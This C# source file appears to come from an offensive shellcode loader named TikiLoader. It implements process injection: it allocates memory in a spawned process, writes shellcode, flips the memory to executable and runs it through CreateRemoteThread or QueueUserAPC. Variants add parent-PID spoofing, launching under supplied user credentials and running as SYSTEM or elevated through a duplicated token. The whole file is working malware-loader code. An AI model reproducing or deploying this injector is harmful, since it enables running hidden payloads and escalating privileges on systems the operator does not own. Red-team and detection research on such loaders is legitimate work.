using System;

using static TikiLoader.Generic;
using static TikiLoader.Imports;
using static TikiLoader.Enums;

namespace TikiLoader
{
    public class Injector
    {
        private static IntPtr AllocateVirtualMemory(IntPtr hProcess, uint length)
        {
            return VirtualAllocEx(hProcess, IntPtr.Zero, length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
        }

        private static bool WriteShellcode(IntPtr hProcess, IntPtr baseAddr, byte[] shellcode)
        {
            IntPtr written;
            return WriteProcessMemory(hProcess, baseAddr, shellcode, shellcode.Length, out written);
        }

        private static bool ChangeVirtualMemory(IntPtr hProcess, IntPtr baseAddr, IntPtr shellcodeLength)
        {
            MemoryProtection oldProtect;
            return VirtualProtectEx(hProcess, baseAddr, shellcodeLength, MemoryProtection.ExecuteRead, out oldProtect);
        }

        private static IntPtr ResumeTargetProcess(IntPtr hProcess, IntPtr baseAddr)
        {
            IntPtr threadId;
            return CreateRemoteThread(hProcess, IntPtr.Zero, 0, baseAddr, IntPtr.Zero, 0, out threadId);
        }

        private static IntPtr QueueAPC(IntPtr baseAddr, IntPtr hThread)
        {
            return QueueUserAPC(baseAddr, hThread, IntPtr.Zero);
        }

        private static uint ResumeTargetThread(IntPtr hThread)
        {
            return ResumeThread(hThread);
        }

        // Create Remote Thread

        public static void CRTInject(string binary, byte[] shellcode, int ppid)
        {
            var pinf = StartProcess(binary, ppid);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            ResumeTargetProcess(pinf.hProcess, baseAddr);
        }

        public static void CRTInjectWithoutPid(string binary, byte[] shellcode)
        {
            var pinf = StartProcessWOPid(binary);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            ResumeTargetProcess(pinf.hProcess, baseAddr);
        }

        public static void CRTInjectAs(string binary, string domain, string username, string password, byte[] shellcode)
        {
            var pinf = StartProcessAs(binary, domain, username, password);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            ResumeTargetProcess(pinf.hProcess, baseAddr);
        }

        public static void CRTInjectAsSystem(string binary, int pidToDuplicate, byte[] shellcode)
        {
            var pinf = StartProcessAsSystem(binary, pidToDuplicate);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            ResumeTargetProcess(pinf.hProcess, baseAddr);
        }

        public static void CRTInjectElevated(string binary, int elevatedPid, byte[] shellcode)
        {
            var pinf = StartElevatedProcess(binary, elevatedPid);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            ResumeTargetProcess(pinf.hProcess, baseAddr);
        }

        // QueueUserAPC

        public static void QUAPCInject(string binary, byte[] shellcode, int ppid)
        {
            var pinf = StartProcess(binary, ppid);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            QueueAPC(baseAddr, pinf.hThread);
            ResumeTargetThread(pinf.hThread);
        }

        public static void QUAPCInjectWithoutPid(string binary, byte[] shellcode)
        {
            var pinf = StartProcessWOPid(binary);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            QueueAPC(baseAddr, pinf.hThread);
            ResumeTargetThread(pinf.hThread);
        }

        public static void QUAPCInjectAs(string binary, string domain, string username, string password, byte[] shellcode)
        {
            var pinf = StartProcessAs(binary, domain, username, password);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            QueueAPC(baseAddr, pinf.hThread);
            ResumeTargetThread(pinf.hThread);
        }

        public static void QUAPCInjectAsSystem(string binary, int pidToDuplicate, byte[] shellcode)
        {
            var pinf = StartProcessAsSystem(binary, pidToDuplicate);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            QueueAPC(baseAddr, pinf.hThread);
            ResumeTargetThread(pinf.hThread);
        }

        public static void QUAPCInjectElevated(string binary, int elevatedPid, byte[] shellcode)
        {
            var pinf = StartElevatedProcess(binary, elevatedPid);
            var baseAddr = AllocateVirtualMemory(pinf.hProcess, (uint)shellcode.Length);
            WriteShellcode(pinf.hProcess, baseAddr, shellcode);
            ChangeVirtualMemory(pinf.hProcess, baseAddr, (IntPtr)shellcode.Length);
            QueueAPC(baseAddr, pinf.hThread);
            ResumeTargetThread(pinf.hThread);
        }
    }
}